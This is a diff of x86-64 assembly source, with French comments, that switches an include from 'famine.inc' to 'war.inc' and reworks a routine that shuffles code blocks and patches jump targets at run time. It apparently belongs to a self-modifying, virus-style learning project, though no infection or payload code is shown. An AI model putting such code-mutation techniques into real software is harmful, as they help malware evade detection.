@@ -1,4 +1,4 @@
-%include "src/famine.inc"
+%include "../src/war.inc"
 
 BITS 64
 org 0x0                     ; PIE = pas d’adresse fixe
@@ -198,6 +198,7 @@ _start:
 	xor		rax,rax
 	mov		eax, [rel .ptc]
 
+
 	imul	rax, 8
 	lea		rsi, [rel .adr]
 	add		rsi, rax
@@ -205,7 +206,8 @@ _start:
 
 
 	mov		rsi, [rsi] ;se trouve les bonnes values
-	sub		rdi, 8
+
+	;sub		rdi, 8
 	mov		[rdi], rsi
 
 	inc		qword [rel .ptc]
@@ -379,6 +381,11 @@ shuffle:
 ret
 
 write:
+	lea	rdi, [rel code]
+	lea	rsi, [rel end_code]
+
+	call	patchjmp
+
 	lea	rdi, [rel start_shuffle]
 	lea	rsi, [rel end_shuffle]
 	call	shuffle
@@ -407,11 +414,13 @@ write:
 	lea	rsi, [rel end_code]
 
 	call	patchjmp
+
 	code:
 
 
-	jmp	[rel .addr0]
+	jmp	[rel .addr0r]
 	.addr0:	dq 0x421900000000
+	.addr0r: dq 0
 	start_shuffle:
 
 	; BLOC 1
@@ -426,8 +435,9 @@ write:
 	lea	rsi, [rel msg1 - 3]
 	mov	rdx, 2
 	syscall
-	jmp	[rel .addr2]
+	jmp	[rel .addr2r]
 	.addr2: dq 0x421900000002
+	.addr2r: dq 0
 	dq 0x696900000002
 
 
@@ -443,8 +453,9 @@ write:
 	lea	rsi, [rel msg0 - 3]
 	mov	rdx, 2
 	syscall
-	jmp	[rel .addr1]
+	jmp	[rel .addr1r]
 	.addr1: dq 0x421900000001
+	.addr1r: dq 0
 	dq 0x696900000001
 
 
@@ -460,8 +471,9 @@ write:
 	lea	rsi, [rel msg2 - 3]
 	mov	rdx, 2
 	syscall
-	jmp	[rel .addr3]
+	jmp	[rel .addr3r]
 	.addr3: dq 0x421900000003
+	.addr3r: dq 0
 	dq 0x696900000003
 	end_shuffle:
 	dq	1942, 3
